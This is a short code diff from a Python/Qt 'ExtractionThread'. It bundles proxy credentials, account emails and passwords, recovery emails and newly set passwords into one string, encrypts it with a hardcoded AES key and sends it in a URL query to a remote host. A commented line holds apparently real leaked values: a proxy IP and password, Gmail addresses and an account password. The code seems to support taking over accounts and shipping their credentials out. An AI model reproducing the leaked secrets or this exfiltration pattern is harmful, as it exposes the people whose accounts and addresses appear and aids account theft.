@@ -602,8 +602,8 @@ class ExtractionThread(QThread):
                         time.sleep(2)
                         
                         # combined = f"{ip_address};{port};{login};{password};{profile_email};{profile_password};{recovery_email};{new_password};{new_recovery_email}"
-                        combined = f"{ip_address};{port};{login};{password};{profile_email};{profile_password};{recovery_email}"
-
+                        combined = f"{ip_address};{port};{login};{password};{profile_email};{profile_password};{recovery_email};{new_password};{new_recovery_email}"
+                        # combined = f"172.241.245.100;29842;lwaror;GKM4S6SK;bvfghfdfsdfghhjnbbvghfffhcf@gmail.com;4VBGF6ym1Z;ahmedramadan8513@gmail.com;{new_password};{g}"
                         b64 = EncryptionService.encrypt_aes_gcm("A9!fP3z$wQ8@rX7kM2#dN6^bH1&yL4t*", combined)
                         url =f"https://example.com/?rep={b64}"
 
